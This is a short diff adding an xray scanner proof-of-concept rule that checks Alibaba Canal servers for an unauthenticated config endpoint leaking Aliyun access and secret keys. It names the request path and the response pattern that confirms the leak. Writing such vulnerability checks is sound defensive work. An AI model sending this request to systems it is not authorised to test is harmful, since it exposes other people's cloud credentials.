@@ -1,0 +1,13 @@
+name: poc-yaml-alibaba-canal-info-leak
+rules:
+  r0:
+    request:
+      method: GET
+      path: /api/v1/canal/config/1/1
+      follow_redirects: false
+    expression: |
+        response.status == 200 && response.content_type.icontains("application/json") && response.body.bcontains(b"ncanal.aliyun.accessKey") && response.body.bcontains(b"ncanal.aliyun.secretKey")
+expression: r0()
+detail:
+  links:
+    - https://github.com/chaitin/xray/pull/1052
